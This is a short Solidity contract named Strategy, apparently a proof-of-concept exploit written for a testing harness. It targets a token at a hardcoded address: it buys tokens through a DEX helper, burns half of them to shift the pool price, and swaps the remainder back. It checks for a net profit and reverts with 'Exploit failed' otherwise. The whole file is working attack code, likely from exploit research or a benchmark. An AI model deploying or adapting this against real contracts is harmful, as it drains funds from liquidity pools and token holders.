pragma solidity ^0.8.2;

import "./Harness.sol";

contract Strategy {
    address public constant TARGET = 0xc6Cb12df4520B7Bf83f64C79c585b8462e18B6Aa;
    IERC20 public token = IERC20(TARGET);
    DexUtils public dexUtils;

    constructor() {
        dexUtils = Harness(address(this)).dexUtils();
    }

    function run() public {
        // Get initial native token balance (provided by harness)
        uint256 initialBalance = address(this).balance;

        // Buy tokens with half of the native tokens
        uint256 amountToSwap = initialBalance / 2;
        dexUtils.swapExactBaseTokenToToken{value: amountToSwap}(address(token), amountToSwap);

        // Check token balance
        uint256 tokenBalance = token.balanceOf(address(this));
        require(tokenBalance > 0, "No tokens bought");

        // Burn half of the tokens
        uint256 burnAmount = tokenBalance / 2;
        token.burn(burnAmount);

        // Check token balance after burn
        uint256 newTokenBalance = token.balanceOf(address(this));

        // Swap all tokens back to base token
        token.approve(address(dexUtils), newTokenBalance);
        dexUtils.swapExcessTokensToBaseToken(address(token));

        // Check final native token balance
        uint256 finalBalance = address(this).balance;

        require(finalBalance > initialBalance, "Exploit failed");
    }

    receive() external payable {}
}
